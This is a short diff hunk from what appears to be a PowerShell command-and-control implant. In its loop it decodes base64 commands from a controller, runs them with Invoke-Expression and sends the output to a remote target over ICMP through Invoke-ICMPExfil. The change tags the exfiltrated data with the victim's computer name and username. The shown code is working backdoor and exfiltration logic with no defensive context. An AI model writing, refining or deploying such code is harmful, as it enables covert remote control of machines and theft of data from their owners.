@@ -50,7 +50,7 @@ while ($true) {
     if ($r -match "^c:(..*)$") {
         $command = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($matches[1]))
         $out = Invoke-Expression $command 2>&1|out-string
-        Invoke-ICMPExfil -Payload $out -Target $target -HostName $env:USERNAME -MaxSize 1000
+        Invoke-ICMPExfil -Payload $out -Target $target -HostName "$env:COMPUTERNAME-$env:USERNAME" -MaxSize 1000
     }
     start-sleep $sleep
 }
